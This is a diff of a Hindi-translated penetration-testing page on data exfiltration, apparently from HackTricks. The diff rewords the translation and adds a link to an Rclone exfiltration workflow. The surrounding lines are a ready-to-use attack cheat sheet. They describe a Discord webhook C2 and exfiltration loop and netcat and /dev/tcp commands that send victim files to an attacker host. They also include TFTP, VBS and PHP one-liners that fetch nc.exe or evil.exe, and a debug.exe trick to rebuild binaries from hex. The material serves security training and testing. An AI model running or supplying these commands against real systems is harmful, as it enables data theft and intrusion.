@@ -2,9 +2,16 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
+> [!TIP]
+> end-to-end उदाहरण के लिए, जिसमें loot को `C:\Users\Public` में स्टेज किया जाता है और Rclone के साथ इसे exfiltrating कर वैध backups की नकल की जाती है, नीचे दिए गए workflow की समीक्षा करें।
+
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
 ## Commonly whitelisted domains to exfiltrate information
 
-[https://lots-project.com/](https://lots-project.com/) देखें ताकि commonly whitelisted domains ढूँढे जा सकें जिनका दुरुपयोग किया जा सकता है
+जाँचें [https://lots-project.com/](https://lots-project.com/) ताकि commonly whitelisted domains मिल सकें जिनका दुरुपयोग किया जा सकता है
 
 ## Copy\&Paste Base64
 
@@ -100,13 +107,13 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) C2 और Data Exfiltration के लिए
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks write-only HTTPS endpoints हैं जो JSON और वैकल्पिक file parts स्वीकार करते हैं। इन्हें आमतौर पर विश्वसनीय SaaS domains पर अनुमति दी जाती है और इनके लिए OAuth/API keys की आवश्यकता नहीं होती, जिससे ये low-friction beaconing और exfiltration के लिए उपयोगी रहते हैं।
+Webhooks write-only HTTPS endpoints होते हैं जो JSON और वैकल्पिक file parts स्वीकार करते हैं। इन्हें आमतौर पर trusted SaaS domains पर अनुमति दी जाती है और इन्हें OAuth/API keys की ज़रूरत नहीं होती, जिससे ये low-friction beaconing और exfiltration के लिए उपयोगी होते हैं।
 
 Key ideas:
-- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data जिसमें payload_json नाम का एक हिस्सा हो जो {"content":"..."} समाहित करे और वैकल्पिक file part(s) नामक file शामिल हों।
+- Endpoint: Discord उपयोग करता है https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data के साथ एक पार्ट जिसका नाम payload_json है और जिसमें {"content":"..."} होता है, और वैकल्पिक file part(s) जिनका नाम file होता है।
 - Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK डिलीवरी की पुष्टि करते हैं।
 
 PowerShell PoC (Discord):
@@ -178,8 +185,8 @@ Start-Sleep -Seconds 20
 }
 ```
 नोट:
-- समान पैटर्न अन्य सहयोगी प्लेटफ़ॉर्म (Slack/Teams) पर भी लागू होते हैं जो अपने incoming webhooks का उपयोग करते हैं; URL और JSON schema को तदनुसार समायोजित करें।
-- Discord Desktop cache artifacts और webhook/API recovery के DFIR के लिए देखें:
+- समान पैटर्न अन्य सहयोगी प्लेटफ़ॉर्मों (Slack/Teams) पर भी लागू होते हैं जो उनके incoming webhooks का उपयोग करते हैं; URL और JSON schema के अनुसार समायोजित करें।
+- Discord Desktop के cache artifacts और webhook/API recovery के DFIR के लिए, देखें:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -192,12 +199,12 @@ Start-Sleep -Seconds 20
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP सर्वर (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP सर्वर (pure-ftp)
+### FTP server (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -235,7 +242,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-या एक smb share बनाएं **using samba**:
+या smb शेयर **samba का उपयोग करके**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -260,19 +267,19 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-attacker के सिस्टम पर SSHd चल रहा होना चाहिए।
+attacker के पास SSHd चल रहा होना चाहिए।
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-यदि victim के पास SSH है, तो attacker victim से attacker पर एक directory mount कर सकता है।
+यदि लक्षित सिस्टम पर SSH उपलब्ध है, तो हमलावर उस सिस्टम की किसी डायरेक्टरी को अपने सिस्टम पर माउंट कर सकता है।
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## NC
+## एनसी
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -284,7 +291,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### लक्ष्य पर फ़ाइल अपलोड करें
+### फ़ाइल को victim पर अपलोड करें
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -313,33 +320,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-यदि आप किसी SMTP server पर डेटा भेज सकते हैं, तो आप python के साथ डेटा प्राप्त करने के लिए एक SMTP बना सकते हैं:
+यदि आप किसी SMTP server को डेटा भेज सकते हैं, तो आप python के साथ डेटा प्राप्त करने के लिए एक SMTP बना सकते हैं:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-XP और 2003 में डिफ़ॉल्ट रूप से उपलब्ध है (अन्य में इसे इंस्टॉलेशन के दौरान स्पष्ट रूप से जोड़ना पड़ता है)
+डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इसे इंस्टॉलेशन के दौरान स्पष्ट रूप से जोड़ना होता है)
 
-Kali में, **TFTP server शुरू करें**:
+Kali में, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**python में TFTP सर्वर:**
+**TFTP सर्वर python में:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**पीड़ित** में Kali server से कनेक्ट करें:
+**victim** में, Kali सर्वर से कनेक्ट करें:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP oneliner के साथ फ़ाइल डाउनलोड करें:
+PHP oneliner से फ़ाइल डाउनलोड करें:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -347,7 +354,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**पीड़ित**
+**शिकार**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -381,13 +388,17 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` प्रोग्राम न केवल binaries का निरीक्षण करने की अनुमति देता है बल्कि इसमें **hex से उन्हें पुनर्निर्मित करने की क्षमता** भी है। इसका मतलब है कि किसी binary का hex प्रदान करके, `debug.exe` उस binary फ़ाइल को बना सकता है। हालाँकि, यह ध्यान रखना महत्वपूर्ण है कि debug.exe में **64 kb तक के आकार वाली फ़ाइलों को असेंबल करने की सीमा** है।
+`debug.exe` प्रोग्राम न केवल binaries का निरीक्षण करने की अनुमति देता है बल्कि इसमें **hex से उन्हें पुनर्निर्मित करने की क्षमता** भी है। 
+
+इसका मतलब है कि किसी बाइनरी का hex प्रदान करके, `debug.exe` बाइनरी फ़ाइल जनरेट कर सकता है। 
+
+हालाँकि, यह ध्यान देने योग्य है कि debug.exe में **आकार में 64 kb तक की फाइलों को असेंबल करने की सीमा** है।
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-फिर टेक्स्ट को windows-shell में कॉपी-पेस्ट करें और nc.exe नाम की एक फ़ाइल बनाई जाएगी।
+फिर उस टेक्स्ट को windows-shell में कॉपी-पेस्ट करें और nc.exe नाम की एक फ़ाइल बन जाएगी।
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
